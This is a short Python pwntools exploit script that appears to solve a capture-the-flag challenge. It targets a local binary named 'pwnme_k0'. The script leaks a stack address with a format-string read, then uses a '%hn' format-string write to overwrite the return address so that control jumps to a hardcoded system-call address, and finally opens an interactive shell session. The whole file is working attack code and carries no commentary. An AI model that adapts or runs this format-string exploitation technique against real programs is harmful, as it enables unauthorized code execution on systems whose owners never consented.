from pwn import *

context.log_level = 'debug'
p = process('./pwnme_k0')

system_addr = 0x00000000004008AA

p.recvuntil('Input your username(max lenth:20):')
p.sendline('%6$p')
p.recvuntil('Input your password(max lenth:20):')
p.sendline('%6$p')
p.recvuntil('>')
p.sendline('1')

data = int(p.recv(14),16)
print 'data: ' + hex(data)

ret_addr = data - 0x38
# ~ payload = '%2214c%12$hn'
# ~ payload += p64(ret_addr)
payload = p64(data) + '%%%dc' % (0x08AA - 8)+'%8$hn'
p.recvuntil('>')
p.sendline('2')
p.recvuntil('please input new username(max lenth:20):')
p.sendline('b'*8)
p.recvuntil('please input new password(max lenth:20):')
p.send(payload)

p.recvuntil('>')
p.sendline('1')
p.interactive()
